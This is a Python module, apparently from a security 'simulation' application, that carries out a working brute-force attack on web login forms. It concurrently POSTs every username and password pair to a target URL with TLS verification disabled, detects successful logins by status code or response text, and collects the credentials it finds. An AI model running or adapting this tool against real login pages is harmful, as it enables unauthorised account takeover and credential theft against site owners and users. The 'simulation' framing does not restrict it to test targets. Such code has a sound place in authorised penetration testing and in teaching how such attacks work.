from app.simulations.simulation_params import BruteForceParams
from typing import Dict, Any, List, Callable, Coroutine
import httpx
import asyncio
import traceback

async def run_bruteforce_simulation(
    params: BruteForceParams, 
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    total_possible_attempts = len(params.usernames) * len(params.passwords)
    simulation_halted = False

    await progress_callback({
        "type": "progress", "message": "Starting brute force attack...", 
        "completed": 0, "total": total_possible_attempts
    })

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            # POST isteğini her zaman str(params.target_url) ile yapalım
            response = await session.post(str(params.target_url), data=login_payload, timeout=15.0, follow_redirects=True)
            success = False
            response_text_lower = response.text.lower()

            if params.success_status_code and response.status_code == params.success_status_code:
                success = True
            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                success = True
            
            if success:
                credentials_found.append({"username": username, "password": password})
                await progress_callback({ "type": "progress", "message": f"SUCCESS! Found credentials for {username}!" })
                return True
        except httpx.RequestError as e:
            # Ağ hatalarını loglayalım ki görebilelim
            print(f"Brute force request error for {username}: {e}")
        except Exception as e:
            # Diğer beklenmedik hataları da loglayalım
            print(f"Unexpected error in try_single_login for {username}: {e}")
            print(traceback.format_exc())
        finally:
            total_attempts_made += 1
            if total_attempts_made % 5 == 0 or total_attempts_made == total_possible_attempts:
                 await progress_callback({
                    "type": "progress", "message": f"Attempt {total_attempts_made}/{total_possible_attempts}...",
                    "completed": total_attempts_made, "total": total_possible_attempts
                })
        return False

    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            
            password_tasks = [worker(client, username, password) for password in params.passwords]
            # `gather`'a return_exceptions=True ekleyelim ki görevlerden biri çökerse ana program çökmesin
            results = await asyncio.gather(*password_tasks, return_exceptions=True)

            # Hataları kontrol et ve logla
            for res in results:
                if isinstance(res, Exception):
                    print(f"A worker failed with an exception: {res}")
            
            # Başarılı sonuçları kontrol et
            successful_logins = [res for res in results if isinstance(res, bool) and res]
            if successful_logins and params.stop_on_first_success:
                simulation_halted = True
                break

    result = { "total_attempts_made": total_attempts_made, "credentials_found": credentials_found, "simulation_halted_early": simulation_halted }
    return result